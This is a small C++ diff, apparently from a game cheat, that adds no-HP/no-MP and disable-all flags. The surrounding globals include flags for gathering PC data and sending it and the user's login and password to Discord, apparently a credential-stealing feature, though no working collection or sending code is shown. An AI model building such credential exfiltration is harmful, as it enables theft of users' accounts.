@@ -76,7 +76,8 @@ std::vector<std::string> dates;
 //Fim registro
 
 //Var
-bool bFlag = false, bGetDadosPC = false, bSendDadosPCToDiscord = false, bSendLoginToDiscord = false;
+extern bool bNoHp, bNoMp;
+bool bDisableAll = false, bFlag = false, bGetDadosPC = false, bSendDadosPCToDiscord = false, bSendLoginToDiscord = false;
 std::string dwLogin, dwPassword;
 
 std::string computerName;
